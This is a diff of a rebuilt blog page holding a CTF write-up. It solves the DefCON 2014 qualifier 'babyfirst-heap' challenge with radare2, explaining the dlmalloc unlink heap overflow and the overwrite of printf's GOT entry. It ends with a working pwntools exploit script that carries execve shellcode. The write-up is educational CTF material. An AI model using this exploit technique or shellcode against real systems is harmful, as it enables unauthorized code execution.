@@ -43,10 +43,10 @@
     <div class="sidebar-about">
       <h1>
         <a href="/">
-          Álvaro Felipe Melchor
+          Álvaro
         </a>
       </h1>
-      <p class="lead">Stuff about everything</p>
+      <p class="lead">Still learning</p>
     </div>
 
     <nav class="sidebar-nav">
@@ -111,35 +111,42 @@
       <div class="post">
   <h1 class="post-title">Solving 'heap' from DefCON 2014 qualified with r2</h1>
   <span class="post-date">07 May 2016</span>
-  <p>This article will introduce r2 to resolve a simple CTF from Defcon &#39;14 using Linux. For those who do not know radare2 is a <code>unix-like reverse engineering framework and commandline tools</code> and the most important thing about it is that it is open source thus we can play with it. </p>
+  <p>This article will introduce r2 to resolve a simple CTF from Defcon ‘14 using Linux. For those who do not know radare2 is a <code class="highlighter-rouge">unix-like reverse engineering framework and commandline tools</code> and the most important thing about it is that it is open source thus we can play with it.</p>
 
 <p>Radare2 gives us the possibility to do reverse engineering and more by free as we will look on this post though we are not going too deeply into the commands. I leave it as an exercise for the reader.</p>
 
 <p>Most people complain about the lack of doc that r2 has but that is far from the truth. Radare has:</p>
 
 <ul>
-<li>Open source <a href="https://www.gitbook.com/book/radare/radare2book/details">Book</a> in which anyone can contribute.</li>
-<li><a href="http://radare.org/r/talks.html">Talks</a>.</li>
-<li><a href="http://radare.tv/">Asciinema</a> showing usage examples.</li>
-<li>If you append <code>?</code> in each command in r2&#39;s console you will get a little help.</li>
-<li>There is a <a href="http://radare.today/">blog</a>.</li>
-<li>IRC channel on freenode.net <code>#radare</code>. </li>
-<li>Last but not least we have the source code.</li>
+  <li>Open source <a href="https://www.gitbook.com/book/radare/radare2book/details">Book</a> in which anyone can contribute.</li>
+  <li><a href="http://radare.org/r/talks.html">Talks</a>.</li>
+  <li><a href="http://radare.tv/">Asciinema</a> showing usage examples.</li>
+  <li>If you append <code class="highlighter-rouge">?</code> in each command in r2’s console you will get a little help.</li>
+  <li>There is a <a href="http://radare.today/">blog</a>.</li>
+  <li>IRC channel on freenode.net <code class="highlighter-rouge">#radare</code>.</li>
+  <li>Last but not least we have the source code.</li>
 </ul>
 
 <p>The first thing we are going to need is the binary on which we are going to play with.</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">wget https://github.com/ctfs/write-ups-2014/raw/master/def-con-ctf-qualifier-2014/heap/babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c
-</code></pre></div>
-<p>The second one and the most important is radare2 and its tool suites. There is a tip in r2 land and it is <code>use radare2 always from git</code> because of r2 is under strong development and it&#39;s always including fixes and new features.</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">git clone https://github.com/radare/radare2.git
+
+<div class="highlighter-rouge"><pre class="highlight"><code>wget https://github.com/ctfs/write-ups-2014/raw/master/def-con-ctf-qualifier-2014/heap/babyfirst-heap_33ecf0ad56efc1b322088f95dd98827c
+</code></pre>
+</div>
+
+<p>The second one and the most important is radare2 and its tool suites. There is a tip in r2 land and it is <code class="highlighter-rouge">use radare2 always from git</code> because of r2 is under strong development and it’s always including fixes and new features.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>git clone https://github.com/radare/radare2.git
 cd radare2
 ./sys/install.sh
 $ r2 -v # to test that the installation was successful
 # after the installation we have these utilites
 r2agent  r2pm     rabin2   radare2  radiff2  rafind2  ragg2    rahash2  ranal2   rarun2   rasign2  rasm2    rax2
-</code></pre></div>
+</code></pre>
+</div>
+
 <p>We are ready to to do the CTF. As usual in security the first thing to accomplish is gather information, in this case about the binary.</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">[alvaro @ ctf] $ ./babyfirst-heap
+
+<div class="highlighter-rouge"><pre class="highlight"><code>[alvaro @ ctf] $ ./babyfirst-heap
 
 Welcome to your first heap overflow...
 I am going to allocate 20 objects...
@@ -192,188 +199,218 @@ Copied 7 bytes.
 [FREE][address=907A4B0]
 Did you forget to read the flag with your shellcode?
 Exiting
-</code></pre></div>
-<p>Just running it, it gives us a lot of information. The most important in my opinion is <code>Using Dougle Lee Allocator 2.6.1</code>. Just with that we already know about which is our mission here and basically is to fool the memory allocator to overwrite inline metadata to be able to write in arbitrary memory locations. If you do not know about what I am talking about I encourage to read the following articles before to continue: <a href="http://www.phrack.org/issues/57/8.html#article">phrack 57-8</a> and <a href="http://www.openwall.com/articles/JPEG-COM-Marker-Vulnerability">Solar Designer</a>.</p>
+</code></pre>
+</div>
+
+<p>Just running it, it gives us a lot of information. The most important in my opinion is <code class="highlighter-rouge">Using Dougle Lee Allocator 2.6.1</code>. Just with that we already know about which is our mission here and basically is to fool the memory allocator to overwrite inline metadata to be able to write in arbitrary memory locations. If you do not know about what I am talking about I encourage to read the following articles before to continue: [phrack 57-8] (http://www.phrack.org/issues/57/8.html#article) and <a href="http://www.openwall.com/articles/JPEG-COM-Marker-Vulnerability">Solar Designer</a>.</p>
 
 <p>We should download the source code of our allocator to know how to make our exploit work.</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">wget ftp://g.oswego.edu/pub/misc/malloc-2.6.1.c
-</code></pre></div>
-<p>The most important of the code is.
-```C
-struct malloc<em>chunk
-{
-  size</em>t size;               /* Size in bytes, including overhead. <em>/
-  struct malloc_chunk</em> fd;   /* double links -- used only if free. <em>/
-  struct malloc_chunk</em> bk;
-  size_t unused;             /* to pad decl to min chunk size */
-};</p>
 
-<h1>define unlink(p)                                                             \</h1>
+<div class="highlighter-rouge"><pre class="highlight"><code>wget ftp://g.oswego.edu/pub/misc/malloc-2.6.1.c
+</code></pre>
+</div>
+<p>The most important of the code is.</p>
 
-<p>{                                                                             \
-  mchunkptr Bul = (p)-&gt;bk;                                                    \
-  mchunkptr Ful = (p)-&gt;fd;                                                    \
-  Ful-&gt;bk = Bul;  Bul-&gt;fd = Ful;                                              \
-}                                                                             \
-```</p>
+<div class="highlighter-rouge"><pre class="highlight"><code><span class="k">struct</span> <span class="n">malloc_chunk</span>
+<span class="p">{</span>
+  <span class="kt">size_t</span> <span class="n">size</span><span class="p">;</span>               <span class="cm">/* Size in bytes, including overhead. */</span>
+  <span class="k">struct</span> <span class="n">malloc_chunk</span><span class="o">*</span> <span class="n">fd</span><span class="p">;</span>   <span class="cm">/* double links -- used only if free. */</span>
+  <span class="k">struct</span> <span class="n">malloc_chunk</span><span class="o">*</span> <span class="n">bk</span><span class="p">;</span>
+  <span class="kt">size_t</span> <span class="n">unused</span><span class="p">;</span>             <span class="cm">/* to pad decl to min chunk size */</span>
+<span class="p">};</span>
 
-<p>If you read the article that I pointed before you already know why this is important. If not badly done but the idea is how the allocator handle the memory. It handles memory using <code>malloc_chunk</code> and depending on whether the memory is allocated or freed its fields have different meanings (take into account the difference between the phrack article and our case).</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text"> chunk -&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
+<span class="cp">#define unlink(p)                  \
+{                                  \
+  mchunkptr Bul = (p)-&gt;bk;         \
+  mchunkptr Ful = (p)-&gt;fd;         \
+  Ful-&gt;bk = Bul;  Bul-&gt;fd = Ful;   \
+}                                  \
+</span></code></pre>
+</div>
+
+<p>If you read the article that I pointed before you already know why this is important. If not badly done but the idea is how the allocator handle the memory. It handles memory using <code class="highlighter-rouge">malloc_chunk</code> and depending on whether the memory is allocated or freed its fields have different meanings (take into account the difference between the phrack article and our case).</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code> chunk -&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-
              | size: size of the chunk (the number of bytes between    |
-             | &quot;chunk&quot; and &quot;nextchunk&quot;) and 2 bits status information  |
+             | "chunk" and "nextchunk") and 2 bits status information  |
       mem -&gt; +---------------------------------------------------------+
-             | fd: not used by dlmalloc because &quot;chunk&quot; is allocated   |
+             | fd: not used by dlmalloc because "chunk" is allocated   |
              | (user data therefore starts here)                       |
              + - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
-             | bk: not used by dlmalloc because &quot;chunk&quot; is allocated   |
+             | bk: not used by dlmalloc because "chunk" is allocated   |
              | (there may be user data here)                           |
              + - - - - - - - - - - - - - - - - - - - - - - - - - - - - +
              .                      User data                          .
 nextchunk -&gt; + + + + + + + + + + + + + + + + + + + + + + + + + + + + + +
-</code></pre></div>
-<p>The idea will be to overwrite the <code>size</code>, <code>fd</code> and <code>bk</code> on the <code>nextchunk</code> to execute <code>unlink</code> and get a shell. We can get a shell overwritten this fields because the <code>unlink</code> macro is as follows.</p>
-<div class="highlight"><pre><code class="language-C" data-lang="C"><span class="cp">#define unlink(p)                                                             \</span>
-<span class="cp">{                                                                             \</span>
-<span class="cp">  mchunkptr BK = (p)-&gt;bk;                                                    \</span>
-<span class="cp">  mchunkptr FD = (p)-&gt;fd;                                                    \</span>
-<span class="cp">  FD+8 = BK;  </span>
-  <span class="n">BK</span><span class="o">+</span><span class="mi">4</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>                                                                  \
-<span class="p">}</span>                                                                             \
-</code></pre></div>
-<p>We are able to write in <code>FD+8</code> the direction of <code>BK</code> which will be the direction of our shellcode. However, we are written in <code>BK+4</code> as well so we need to overcome this issue.</p>
+</code></pre>
+</div>
+<p>The idea will be to overwrite the <code class="highlighter-rouge">size</code>, <code class="highlighter-rouge">fd</code> and <code class="highlighter-rouge">bk</code> on the <code class="highlighter-rouge">nextchunk</code> to execute <code class="highlighter-rouge">unlink</code> and get a shell. We can get a shell overwritten this fields because the <code class="highlighter-rouge">unlink</code> macro is as follows.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code><span class="cp">#define unlink(p)           \
+{                           \
+  mchunkptr BK = (p)-&gt;bk;   \
+  mchunkptr FD = (p)-&gt;fd;   \
+  FD+8 = BK; 	            \ 
+</span>  <span class="n">BK</span><span class="o">+</span><span class="mi">4</span> <span class="o">=</span> <span class="n">FD</span><span class="p">;</span>                \
+<span class="p">}</span>                           \
+
+</code></pre>
+</div>
+
+<p>We are able to write in <code class="highlighter-rouge">FD+8</code> the direction of <code class="highlighter-rouge">BK</code> which will be the direction of our shellcode. However, we are written in <code class="highlighter-rouge">BK+4</code> as well so we need to overcome this issue.</p>
 
 <p>Until this point I hope that more or less the how to exploit the binary be clear.</p>
 
-<p>It&#39;s time to get our hands dirty using r2 and continue getting info from our binary. Radare2 at first can seem difficult but once you start learning is very powerfull it&#39;s the same feeling than <code>vim</code>. The best part is that r2 follows the same philosophy as vim and every command has a meaning; it just a matter of time to get used to them.</p>
+<p>It’s time to get our hands dirty using r2 and continue getting info from our binary. Radare2 at first can seem difficult but once you start learning is very powerfull it’s the same feeling than <code class="highlighter-rouge">vim</code>. The best part is that r2 follows the same philosophy as vim and every command has a meaning; it just a matter of time to get used to them.</p>
 
 <ol>
-<li><code>a</code> and its subcommands stand by analyze.
-
-<ul>
-<li><code>af</code> = analyze function</li>
-<li><code>aac</code> = analyze calls</li>
-<li>...</li>
-</ul></li>
-<li><code>i</code> and its subcommands stand by info.
-
-<ul>
-<li><code>is</code> = info symbols</li>
-<li><code>ii</code> = info imports</li>
-<li>...</li>
-</ul></li>
-<li><code>~</code> is the internal grep</li>
-<li><code>@</code> temporal seek</li>
+  <li><code class="highlighter-rouge">a</code> and its subcommands stand by analyze.
+    <ul>
+      <li><code class="highlighter-rouge">af</code> = analyze function</li>
+      <li><code class="highlighter-rouge">aac</code> = analyze calls</li>
+      <li>…</li>
+    </ul>
+  </li>
+  <li><code class="highlighter-rouge">i</code> and its subcommands stand by info.
+    <ul>
+      <li><code class="highlighter-rouge">is</code> = info symbols</li>
+      <li><code class="highlighter-rouge">ii</code> = info imports</li>
+      <li>…</li>
+    </ul>
+  </li>
+  <li><code class="highlighter-rouge">~</code> is the internal grep</li>
+  <li><code class="highlighter-rouge">@</code> temporal seek</li>
 </ol>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>alvaro @ ctf<span class="o">]</span> <span class="nv">$ </span>r2 babyfirst-heap
- -- Execute a <span class="nb">command </span>every <span class="nb">time </span>a breakpoint is hit with <span class="s1">&#39;e cmd.bp = !my-program&#39;</span>
-<span class="o">[</span>0x080486f0<span class="o">]</span>&gt; i?
+
+<div class="highlighter-rouge"><pre class="highlight"><code><span class="o">[</span>alvaro @ ctf] <span class="nv">$ </span>r2 babyfirst-heap
+ -- Execute a <span class="nb">command </span>every <span class="nb">time </span>a breakpoint is hit with <span class="s1">'e cmd.bp = !my-program'</span>
+<span class="gp">[0x080486f0]&gt; </span>i?
 ... get <span class="nb">help </span>and to know what does this <span class="nb">command</span>
-<span class="o">[</span>0x080486f0<span class="o">]</span>&gt; <span class="c"># ~ is the internal grep</span>
-<span class="o">[</span>0x080486f0<span class="o">]</span>&gt; i~pic,nx,canary
-pic      <span class="nb">false</span>
-canary   <span class="nb">false</span>
-nx       <span class="nb">true</span>
-<span class="o">[</span>0x080486f0<span class="o">]</span>&gt; ik~relro
+<span class="gp">[0x080486f0]&gt; </span><span class="c"># ~ is the internal grep</span>
+<span class="gp">[0x080486f0]&gt; </span>i~pic,nx,canary
+pic      <span class="nb">false
+</span>canary   <span class="nb">false
+</span>nx       <span class="nb">true</span>
+<span class="gp">[0x080486f0]&gt; </span>ik~relro
 elf.relro<span class="o">=</span>partial relro
-</code></pre></div><div class="highlight"><pre><code class="language-text" data-lang="text">[alvaro @ ctf] $ ./babyfirst-heap &amp;
+</code></pre>
+</div>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>[alvaro @ ctf] $ ./babyfirst-heap &amp;
 [1] 11677
 [1]+  Detenido                ./babyfirst-heap
 [alvaro @ ctf] $ cat /proc/11677/maps |grep heap
 ...
 097e2000-097e8000 rwxp 00000000 00:00 0                                  [heap]
-</code></pre></div>
+</code></pre>
+</div>
 <p>We have in our hands a binary without PIC, with partial RELRO and executable heap. It means that we can modify a <a href="https://www.technovelty.org/linux/plt-and-got-the-key-to-code-sharing-and-dynamic-libraries.html">GOT entry</a> to get control over the program execution flow and allocate our shellcode on the heap.</p>
-<div class="highlight"><pre><code class="language-bash" data-lang="bash"><span class="o">[</span>alvaro @ ctf<span class="o">]</span> <span class="nv">$ </span>r2 babyfirst-heap
+
+<div class="highlighter-rouge"><pre class="highlight"><code><span class="o">[</span>alvaro @ ctf] <span class="nv">$ </span>r2 babyfirst-heap
  -- Insert coin to <span class="k">continue</span>..
-<span class="o">[</span>0x080486f0<span class="o">]</span>&gt; ir <span class="c"># get the binary&#39;s relocations</span>
-<span class="o">[</span>Relocations<span class="o">]</span>
+<span class="gp">[0x080486f0]&gt; </span>ir <span class="c"># get the binary's relocations</span>
+<span class="o">[</span>Relocations]
 <span class="nv">vaddr</span><span class="o">=</span>0x0804bff0 <span class="nv">paddr</span><span class="o">=</span>0x00002ff0 <span class="nb">type</span><span class="o">=</span>SET_32 __gmon_start__
 <span class="nv">vaddr</span><span class="o">=</span>0x0804c880 <span class="nv">paddr</span><span class="o">=</span>0x00003880 <span class="nb">type</span><span class="o">=</span>ADD_64
 <span class="nv">vaddr</span><span class="o">=</span>0x0804c884 <span class="nv">paddr</span><span class="o">=</span>0x00003884 <span class="nb">type</span><span class="o">=</span>ADD_64
 <span class="nv">vaddr</span><span class="o">=</span>0x0804c8a0 <span class="nv">paddr</span><span class="o">=</span>0x000038a0 <span class="nb">type</span><span class="o">=</span>ADD_64
 <span class="nv">vaddr</span><span class="o">=</span>0x0804c000 <span class="nv">paddr</span><span class="o">=</span>0x00003000 <span class="nb">type</span><span class="o">=</span>SET_32 mprotect
-<span class="nv">vaddr</span><span class="o">=</span>0x0804c004 <span class="nv">paddr</span><span class="o">=</span>0x00003004 <span class="nb">type</span><span class="o">=</span>SET_32 <span class="nb">printf</span>
-<span class="nv">vaddr</span><span class="o">=</span>0x0804c008 <span class="nv">paddr</span><span class="o">=</span>0x00003008 <span class="nb">type</span><span class="o">=</span>SET_32 memcpy
+<span class="nv">vaddr</span><span class="o">=</span>0x0804c004 <span class="nv">paddr</span><span class="o">=</span>0x00003004 <span class="nb">type</span><span class="o">=</span>SET_32 <span class="nb">printf
+</span><span class="nv">vaddr</span><span class="o">=</span>0x0804c008 <span class="nv">paddr</span><span class="o">=</span>0x00003008 <span class="nb">type</span><span class="o">=</span>SET_32 memcpy
 <span class="nv">vaddr</span><span class="o">=</span>0x0804c00c <span class="nv">paddr</span><span class="o">=</span>0x0000300c <span class="nb">type</span><span class="o">=</span>SET_32 signal
 <span class="nv">vaddr</span><span class="o">=</span>0x0804c010 <span class="nv">paddr</span><span class="o">=</span>0x00003010 <span class="nb">type</span><span class="o">=</span>SET_32 alarm
 <span class="nv">vaddr</span><span class="o">=</span>0x0804c014 <span class="nv">paddr</span><span class="o">=</span>0x00003014 <span class="nb">type</span><span class="o">=</span>SET_32 _IO_getc
 <span class="nv">vaddr</span><span class="o">=</span>0x0804c018 <span class="nv">paddr</span><span class="o">=</span>0x00003018 <span class="nb">type</span><span class="o">=</span>SET_32 puts
 <span class="nv">vaddr</span><span class="o">=</span>0x0804c01c <span class="nv">paddr</span><span class="o">=</span>0x0000301c <span class="nb">type</span><span class="o">=</span>SET_32 __gmon_start__
-<span class="nv">vaddr</span><span class="o">=</span>0x0804c020 <span class="nv">paddr</span><span class="o">=</span>0x00003020 <span class="nb">type</span><span class="o">=</span>SET_32 <span class="nb">exit</span>
-<span class="nv">vaddr</span><span class="o">=</span>0x0804c024 <span class="nv">paddr</span><span class="o">=</span>0x00003024 <span class="nb">type</span><span class="o">=</span>SET_32 __libc_start_main
+<span class="nv">vaddr</span><span class="o">=</span>0x0804c020 <span class="nv">paddr</span><span class="o">=</span>0x00003020 <span class="nb">type</span><span class="o">=</span>SET_32 <span class="nb">exit
+</span><span class="nv">vaddr</span><span class="o">=</span>0x0804c024 <span class="nv">paddr</span><span class="o">=</span>0x00003024 <span class="nb">type</span><span class="o">=</span>SET_32 __libc_start_main
 <span class="nv">vaddr</span><span class="o">=</span>0x0804c028 <span class="nv">paddr</span><span class="o">=</span>0x00003028 <span class="nb">type</span><span class="o">=</span>SET_32 fprintf
 <span class="nv">vaddr</span><span class="o">=</span>0x0804c02c <span class="nv">paddr</span><span class="o">=</span>0x0000302c <span class="nb">type</span><span class="o">=</span>SET_32 setvbuf
 <span class="nv">vaddr</span><span class="o">=</span>0x0804c030 <span class="nv">paddr</span><span class="o">=</span>0x00003030 <span class="nb">type</span><span class="o">=</span>SET_32 memset
 <span class="nv">vaddr</span><span class="o">=</span>0x0804c034 <span class="nv">paddr</span><span class="o">=</span>0x00003034 <span class="nb">type</span><span class="o">=</span>SET_32 sbrk
 
-<span class="m">18</span> relocations
-<span class="o">[</span>0x080486f0<span class="o">]</span>&gt; S <span class="c"># get sections</span>
-<span class="o">[</span>00<span class="o">]</span> . 0x00000154 -r-- <span class="nv">va</span><span class="o">=</span>0x08048154 <span class="nv">sz</span><span class="o">=</span>0x0013 <span class="nv">vsz</span><span class="o">=</span>0x0013 .interp
+18 relocations
+<span class="gp">[0x080486f0]&gt; </span>S <span class="c"># get sections</span>
+<span class="o">[</span>00] . 0x00000154 -r-- <span class="nv">va</span><span class="o">=</span>0x08048154 <span class="nv">sz</span><span class="o">=</span>0x0013 <span class="nv">vsz</span><span class="o">=</span>0x0013 .interp
 ....
-<span class="o">[</span>21<span class="o">]</span> . 0x00002ff0 -rw- <span class="nv">va</span><span class="o">=</span>0x0804bff0 <span class="nv">sz</span><span class="o">=</span>0x0004 <span class="nv">vsz</span><span class="o">=</span>0x0004 .got
-<span class="o">[</span>22<span class="o">]</span> . 0x00002ff4 -rw- <span class="nv">va</span><span class="o">=</span>0x0804bff4 <span class="nv">sz</span><span class="o">=</span>0x0044 <span class="nv">vsz</span><span class="o">=</span>0x0044 .got.plt
-<span class="o">[</span>23<span class="o">]</span> . 0x00003040 -rw- <span class="nv">va</span><span class="o">=</span>0x0804c040 <span class="nv">sz</span><span class="o">=</span>0x0824 <span class="nv">vsz</span><span class="o">=</span>0x0824 .data
+<span class="o">[</span>21] . 0x00002ff0 -rw- <span class="nv">va</span><span class="o">=</span>0x0804bff0 <span class="nv">sz</span><span class="o">=</span>0x0004 <span class="nv">vsz</span><span class="o">=</span>0x0004 .got
+<span class="o">[</span>22] . 0x00002ff4 -rw- <span class="nv">va</span><span class="o">=</span>0x0804bff4 <span class="nv">sz</span><span class="o">=</span>0x0044 <span class="nv">vsz</span><span class="o">=</span>0x0044 .got.plt
+<span class="o">[</span>23] . 0x00003040 -rw- <span class="nv">va</span><span class="o">=</span>0x0804c040 <span class="nv">sz</span><span class="o">=</span>0x0824 <span class="nv">vsz</span><span class="o">=</span>0x0824 .data
 ....
-</code></pre></div>
+</code></pre>
+</div>
+
 <p>To dissasemble the binary and read what is going on exactly, just run these commands.</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">[alvaro @ ctf] $ r2 babyfirst-heap
+
+<div class="highlighter-rouge"><pre class="highlight"><code>[alvaro @ ctf] $ r2 babyfirst-heap
  -- Change the UID of the debugged process with child.uid (requires root)
 [0x080486f0]&gt; s main # seek to the main symbol
 [0x0804890b]&gt; af # define a function
 [0x0804890b]&gt; Vp # get into visual mode, p rotates the print mode, by default is in hex (without p)
 use j/k to navigate and ? for help 
-</code></pre></div>
-<p>If you understand the code you will see that the object that we are going to overflow is always the same size and it resides in <code>esp + 0x60</code></p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">0x080489d6   cmp dword [esp + 0x133c], 0xa                 ; [0xa:4]=0 ; main.c:133
+</code></pre>
+</div>
+
+<p>If you understand the code you will see that the object that we are going to overflow is always the same size and it resides in <code class="highlighter-rouge">esp + 0x60</code></p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>0x080489d6   cmp dword [esp + 0x133c], 0xa                 ; [0xa:4]=0 ; main.c:133
 0x080489de   jne 0x80489eb                                 ;[4]
 0x080489e0   mov dword [esp + 0x1338], 0x104               ; [0x104:4]=196 ; main.c:134 
 ..
 esp+0x1338 will hold the size in this case 0x104=206 (run: rax2 0x104)
-</code></pre></div>
-<p>Now it&#39;s time to debug to understand even better the binary.</p>
+</code></pre>
+</div>
 
-<p><a href="https://asciinema.org/a/5b5awdpwlskukiv6fofivlccb"><img src="https://asciinema.org/a/5b5awdpwlskukiv6fofivlccb.png" alt="asciicast"></a> </p>
+<p>Now it’s time to debug to understand even better the binary.</p>
+
+<p><a href="https://asciinema.org/a/5b5awdpwlskukiv6fofivlccb"><img src="https://asciinema.org/a/5b5awdpwlskukiv6fofivlccb.png" alt="asciicast" /></a></p>
 
 <p>As you just saw we have full control of the next chunk and our mission will be.</p>
 
 <ul>
-<li>Write the next size field with the latest bit to 1. This will fool the allocator making it think that the chunk is free and the allocator will call unlink.</li>
-<li>Write in the <code>fd</code> field the direction of the relocation of printf minus 8. Why minus 8? If you look again in the unlink function it makes <code>FD-&gt;bk = BK</code> that is equivalent to <code>fd+8 = BK</code> now just substitute <code>fd</code> with <code>&amp;reloc_printf - 8</code> and you will write on <code>reloc_printf</code>. To get the location of <code>reloc_printf</code> just run in r2&#39;s console <code>ir~printf</code>.</li>
-<li>Write in <code>bk</code> the direction of our shellcode that the binary itself gives us.</li>
+  <li>Write the next size field with the latest bit to 1. This will fool the allocator making it think that the chunk is free and the allocator will call unlink.</li>
+  <li>Write in the <code class="highlighter-rouge">fd</code> field the direction of the relocation of printf minus 8. Why minus 8? If you look again in the unlink function it makes <code class="highlighter-rouge">FD-&gt;bk = BK</code> that is equivalent to <code class="highlighter-rouge">fd+8 = BK</code> now just substitute <code class="highlighter-rouge">fd</code> with <code class="highlighter-rouge">&amp;reloc_printf - 8</code> and you will write on <code class="highlighter-rouge">reloc_printf</code>. To get the location of <code class="highlighter-rouge">reloc_printf</code> just run in r2’s console <code class="highlighter-rouge">ir~printf</code>.</li>
+  <li>Write in <code class="highlighter-rouge">bk</code> the direction of our shellcode that the binary itself gives us.</li>
 </ul>
 
-<p>But there is still one thing to solve. In the <code>unlink</code> function <code>BK+4</code> is overwritten so our shellcode must take this into account. How we can do that? Just patch the shellcode at the beginning to make a jmp. We use rasm2 to get the exact bytes we need.</p>
-<div class="highlight"><pre><code class="language-text" data-lang="text">[alvaro @ ~] $ rasm2 -a x86 -b 32 &#39;jmp 0x10&#39;
+<p>But there is still one thing to solve. In the <code class="highlighter-rouge">unlink</code> function <code class="highlighter-rouge">BK+4</code> is overwritten so our shellcode must take this into account. How we can do that? Just patch the shellcode at the beginning to make a jmp. We use rasm2 to get the exact bytes we need.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code>[alvaro @ ~] $ rasm2 -a x86 -b 32 'jmp 0x10'
 eb0c
-</code></pre></div>
-<p>The first instruction will jump and whatever is written in <code>BK+4</code> doesn&#39;t matter :). The finally exploit is.</p>
-<div class="highlight"><pre><code class="language-python" data-lang="python"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
+</code></pre>
+</div>
+
+<p>The first instruction will jump and whatever is written in <code class="highlighter-rouge">BK+4</code> doesn’t matter :). The finally exploit is.</p>
+
+<div class="highlighter-rouge"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
 <span class="kn">import</span> <span class="nn">re</span>
 
 <span class="n">reloc_printf</span> <span class="o">=</span> <span class="mh">0x0804c004</span> <span class="c"># ir~printf</span>
 
-<span class="n">conn</span> <span class="o">=</span> <span class="n">remote</span> <span class="p">(</span><span class="s">&#39;127.0.0.1&#39;</span><span class="p">,</span> <span class="mi">8080</span><span class="p">)</span>
+<span class="n">conn</span> <span class="o">=</span> <span class="n">remote</span> <span class="p">(</span><span class="s">'127.0.0.1'</span><span class="p">,</span> <span class="mi">8080</span><span class="p">)</span>
 <span class="n">output</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
 
-<span class="n">s</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span> <span class="p">(</span><span class="s">&quot;\[ALLOC\]\[loc=[a-z,A-z,0-9]+\[size=260\]&quot;</span><span class="p">,</span> <span class="n">output</span><span class="p">)</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">search</span> <span class="p">(</span><span class="s">"</span><span class="err">\</span><span class="s">[ALLOC</span><span class="err">\</span><span class="s">]</span><span class="err">\</span><span class="s">[loc=[a-z,A-z,0-9]+</span><span class="err">\</span><span class="s">[size=260</span><span class="err">\</span><span class="s">]"</span><span class="p">,</span> <span class="n">output</span><span class="p">)</span>
 <span class="n">dir_shellcode</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">group</span><span class="p">()[</span><span class="mi">12</span><span class="p">:</span><span class="mi">19</span><span class="p">],</span><span class="mi">16</span><span class="p">)</span>
-<span class="n">nop</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\x90</span><span class="s">&quot;</span> <span class="o">*</span> <span class="mi">30</span>
+<span class="n">nop</span> <span class="o">=</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span> <span class="o">*</span> <span class="mi">30</span>
 <span class="c">#shellcode from http://shell-storm.org/shellcode/files/shellcode-752.php</span>
-<span class="n">shellcode</span> <span class="o">=</span> <span class="n">nop</span> <span class="o">+</span> <span class="s">&quot;</span><span class="se">\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80</span><span class="s">&quot;</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="n">nop</span> <span class="o">+</span> <span class="s">"</span><span class="se">\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80</span><span class="s">"</span>
 
-<span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;</span><span class="se">\xeb\x0c</span><span class="s">&quot;</span> <span class="c"># jmp_patch</span>
+<span class="n">payload</span> <span class="o">=</span> <span class="s">"</span><span class="se">\xeb\x0c</span><span class="s">"</span> <span class="c"># jmp_patch</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="n">shellcode</span>
-<span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;A&quot;</span><span class="o">*</span> <span class="p">(</span><span class="mi">260</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
+<span class="n">payload</span> <span class="o">+=</span> <span class="s">"A"</span><span class="o">*</span> <span class="p">(</span><span class="mi">260</span> <span class="o">-</span> <span class="nb">len</span><span class="p">(</span><span class="n">payload</span><span class="p">))</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="mh">0x1</span><span class="p">)</span> <span class="c"># make the next chunk free</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">reloc_printf</span> <span class="o">-</span> <span class="mi">8</span><span class="p">)</span>
 <span class="n">payload</span> <span class="o">+=</span> <span class="n">p32</span><span class="p">(</span><span class="n">dir_shellcode</span><span class="p">)</span>
 
-<span class="n">conn</span><span class="o">.</span><span class="n">send</span> <span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="s">&#39;</span><span class="se">\n</span><span class="s">&#39;</span><span class="p">)</span>
+<span class="n">conn</span><span class="o">.</span><span class="n">send</span> <span class="p">(</span><span class="n">payload</span> <span class="o">+</span> <span class="s">'</span><span class="se">\n</span><span class="s">'</span><span class="p">)</span>
 <span class="n">conn</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
-</code></pre></div>
+</code></pre>
